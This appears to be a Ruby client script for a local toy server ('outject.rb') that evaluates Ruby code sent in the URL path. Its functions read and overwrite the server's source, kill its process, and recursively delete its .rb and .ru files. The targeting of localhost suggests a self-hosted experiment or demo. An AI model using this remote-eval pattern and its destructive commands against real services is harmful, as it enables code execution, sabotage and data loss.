require 'rest-client'
require 'cgi'

@endpoint = 'http://localhost:8000/'
@serverFile = 'outject.rb'

def runRuby(str)
  targetUri = @endpoint + (CGI::escape str)
  puts "> #{targetUri}"
  return RestClient.get targetUri
end

def readServer
  return runRuby "File.read '#{@serverFile}'"
end

def writeServer(str)
  remoteCommand = "File.open('#{@serverFile}', 'w') do |file|\n  file.write(#{str.inspect})\nend"
  return runRuby remoteCommand
end

def killServer
  remoteCommand = "pid = (File.read 'rack.pid').to_i\nProcess.kill 'KILL', pid"
  
  begin
    return runRuby remoteCommand
  rescue
    puts "Server disconnected"
  end
end

def nukeServer
  remoteCommand = "FileUtils.rm_rf(Dir.glob('./*.{rb,ru}'), secure: true)"
  return runRuby remoteCommand
end
